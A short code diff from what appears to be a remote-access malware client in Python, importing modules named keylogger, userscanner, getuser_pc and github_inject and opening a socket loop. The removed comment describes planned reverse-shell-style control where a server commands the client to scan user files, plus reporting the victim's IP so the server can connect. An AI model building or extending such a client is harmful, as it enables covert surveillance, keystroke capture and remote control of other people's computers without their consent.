@@ -3,14 +3,7 @@ import userscanner
 import keylogger
 import getuser_pc
 import github_inject
-# TODO finish a client command structure
-""" 
-    This will await commands from the server something like a reverse shell
-    When the server sends a show file request this will call the userscanner function
-    We can extend this to full on reverse shell in the future
-    ALSO:
-        OPTIONAL: make a socket that sends the clients ip so the server will know hwo to connect
-"""
+
 def start_client():
     while True:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
